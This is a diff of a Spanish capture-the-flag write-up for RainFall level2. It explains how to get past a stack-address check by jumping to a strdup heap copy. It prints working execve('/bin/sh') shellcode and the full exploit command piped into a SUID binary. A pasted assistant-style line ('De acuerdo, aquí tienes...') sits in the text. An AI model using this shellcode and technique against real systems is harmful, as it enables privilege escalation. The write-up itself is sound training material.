@@ -191,66 +191,66 @@ Non-debugging symbols:
 0x080485fc  _fini
 ```
 
-3. **Identificamos el BACKDOOR**
-Analizamos el desamblado de la función `p` e identificamos que hay una comprobación diseñada para evitar que hagamos lo mismo que en el Level 1.
+De acuerdo, aquí tienes desde ese punto reescrito de forma más clara:
+
+---
+
+3. **Identificamos la PROTECCIÓN y la BRECHA**
+
+Analizando el desensamblado de `p()` encontramos que el programa tiene un filtro para evitar que hagamos lo mismo que en el Level 1:
 
 ```asm
 0x080484fb <+39>:    and    eax,0xb0000000
 0x08048500 <+44>:    cmp    eax,0xb0000000
 0x08048505 <+49>:    jne    0x8048527 <p+83>
-
 ```
-* El programa verifica si el EIP ha sido alterado para apuntar al Stack.
-* Si `(EIP & 0xb0000000) == 0xb0000000`, el programa asume un ataque y aborta.
-* **Esto impide ejecutar Shellcode directamente desde el buffer del Stack.**
 
+Lo que hace es coger la dirección de retorno (`EIP`), aplicarle una máscara y comprobar si empieza por `0xb`. Si es así, asume que estamos intentando saltar al Stack y aborta el programa. Las direcciones del Stack empiezan por `0xbf...`, así que shellcode directo en el buffer está bloqueado.
+
+Pero más abajo encontramos esto:
 
 ```asm
 0x08048538 <+100>:  call   0x80483e0 <strdup@plt>
-
 ```
-* Aquí está la **brecha**. El programa hace un `strdup` del buffer.
-* `strdup` reserva memoria en el **Heap**.
-* Las direcciones del Heap **no empiezan por `0xb**` (suelen empezar por `0x08`).
-* **El Plan:** Como el filtro solo bloquea el Stack, saltaremos a la copia de nuestra cadena que vive en el Heap.
 
+`strdup()` copia nuestro input en el **Heap**. Las direcciones del Heap empiezan por `0x08...`, que no activa el filtro. Además el Heap es ejecutable porque `NX está OFF`.
 
-* **Objetivo:** `strdup()` Duplica la cadena introducida en el **Heap**. Dado que el Heap es ejecutable (`NX disabled`) y su dirección (`0x08......`) sobrepasa el filtro `0xb0000000`, este es nuestro punto de entrada.
+**El plan:** metemos el shellcode al principio del input, rellenamos hasta el EIP, y ponemos la dirección del Heap donde `strdup` dejó nuestra copia.
 
-## **MAPA VISUAL DEL STACK EN `p()`**
+---
 
-| Dirección | Contenido | Tamaño |
-| --- | --- | --- |
-| **`ebp + 0x04`** | **RET (EIP)** | 4 bytes |
-| **`ebp + 0x00`** | **EBP Viejo** | 4 bytes |
-| ... | *Espacio interno* | ... |
-| **`ebp - 0x4c`** | **INICIO BUFFER** | **76 bytes** (0x4c) |
+4. **Cálculo del Payload (OFFSET):**
 
-4. **Cáculo del PAyload (OFFSET):**
-Para tomar el control del EIP, debemos llenar el stack hasta alcanzar la dirección de retorno:
-
-1. **Buffer útil:** 104 bytes (hasta el final de la reserva local).
-2. **Padding/Alineación:** Buffer (76) + EBP (4) = 80 bytes. Si el Shellcode mide 23 bytes, necesitamos 80−23=57 bytes de basura.
-3. **EBP Viejo:** 4 bytes.
-4. **EIP (Retorno):** Aquí inyectamos nuestra dirección. Debe ser la dirección del Heap donde `strdup` guarda la copia.
-
-
-4. **Cálculo total de caracteres basura (Padding):**
-bytes.
+El buffer empieza en `[ebp-0x4c]`, es decir, 76 bytes por debajo del EBP:
 
 | Offset | Contenido | Valor |
-| --- | --- | --- |
-| **80 - 23** | Basura | "A" * 57 |
-| **21 - 25** | **Nuevo EIP** | `\x08\xa0\x04\x08` (La dirección del `Heap` en Little Endian) |
+|--------|-----------|-------|
+| **0 - 22** | Shellcode | 23 bytes |
+| **23 - 79** | Relleno | "A" * 57 |
+| **80 - 83** | **Nuevo EIP** | Dirección del Heap (Little Endian) |
+
+El shellcode ocupa 23 bytes, rellenamos hasta llegar al EIP (76 bytes de buffer + 4 de EBP = 80), y sobreescribimos el EIP con la dirección donde `strdup` copió nuestro input en el Heap.
+
+---
 
 5. **Análisis de protecciones:**
 
-* **NX: OFF** -> Podríamos usar Shellcode
-* **ASLR: OFF** -> La dirección `0x08048444` es estática y no cambia.
+- **NX: OFF** → El Heap es ejecutable, podemos correr shellcode desde ahí.
+- **ASLR: OFF** → La dirección del Heap es estática, no cambia entre ejecuciones.
+- **Filtro `0xb0000000`** → Bloqueado. Saltamos al Heap en lugar del Stack.
+
+---
 
 6. **Ejecución del Exploit:**
 ```bash
 level2@RainFall:~$ (printf '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80'; printf 'A%.0s' {1..57}; printf '\x08\xa0\x04\x08'; echo; cat) | ./level2
+```
+
+El shellcode abre una `/bin/sh` con los privilegios de `level3` gracias al bit `SUID`.
+
+```bash
+level2@RainFall:~$ (printf '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80'; printf 'A%.0s' {1..57}; printf '\x08\xa0\x04\x08'; echo; cat) | ./level2
+
 1�Ph//shh/bin����°
                   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
 id
